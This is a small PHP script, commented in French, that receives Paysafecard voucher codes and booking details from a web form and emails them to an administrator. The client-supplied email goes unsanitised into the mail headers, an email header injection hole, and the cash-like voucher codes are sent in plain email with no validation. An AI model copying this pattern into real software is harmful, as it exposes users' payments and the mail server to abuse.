<?php
// Ce script traite les soumissions de codes Paysafecard et envoie un email à l'administrateur

// Adresse email de l'administrateur
$admin_email = "votre-email@example.com"; // Remplacez par votre adresse email

// Vérifier si le formulaire a été soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $paysafecard_code = $_POST["paysafecard_code"];
    $paysafecard_amount = $_POST["paysafecard_amount"];
    $client_email = $_POST["client_email"];
    $creator = $_POST["creator"];
    $date = $_POST["date"];
    $duration = $_POST["duration"];
    $location = $_POST["location"];
    $discord = $_POST["discord"];
    
    // Vérifier que les champs obligatoires sont remplis
    if (empty($paysafecard_code) || empty($client_email)) {
        echo json_encode(["success" => false, "message" => "Veuillez remplir tous les champs obligatoires."]);
        exit;
    }
    
    // Préparer le sujet de l'email
    $subject = "Nouveau code Paysafecard reçu";
    
    // Préparer le contenu de l'email
    $message = "NOUVEAU CODE PAYSAFECARD REÇU\n";
    $message .= "---------------------------\n";
    $message .= "Code: " . $paysafecard_code . "\n";
    $message .= "Montant: " . $paysafecard_amount . "€\n\n";
    $message .= "DÉTAILS DE LA RÉSERVATION\n";
    $message .= "---------------------------\n";
    $message .= "Client: " . $client_email . "\n";
    $message .= "Discord: " . $discord . "\n";
    $message .= "Créatrice: " . $creator . "\n";
    $message .= "Date: " . $date . "\n";
    $message .= "Durée: " . $duration . "\n";
    $message .= "Lieu: " . $location . "\n";
    
    // En-têtes de l'email
    $headers = "From: " . $client_email . "\r\n";
    $headers .= "Reply-To: " . $client_email . "\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    // Envoyer l'email
    if (mail($admin_email, $subject, $message, $headers)) {
        echo json_encode(["success" => true, "message" => "Code Paysafecard enregistré avec succès."]);
    } else {
        echo json_encode(["success" => false, "message" => "Erreur lors de l'envoi de l'email."]);
    }
} else {
    // Si le script est accédé directement sans soumission de formulaire
    echo json_encode(["success" => false, "message" => "Accès non autorisé."]);
}
?>

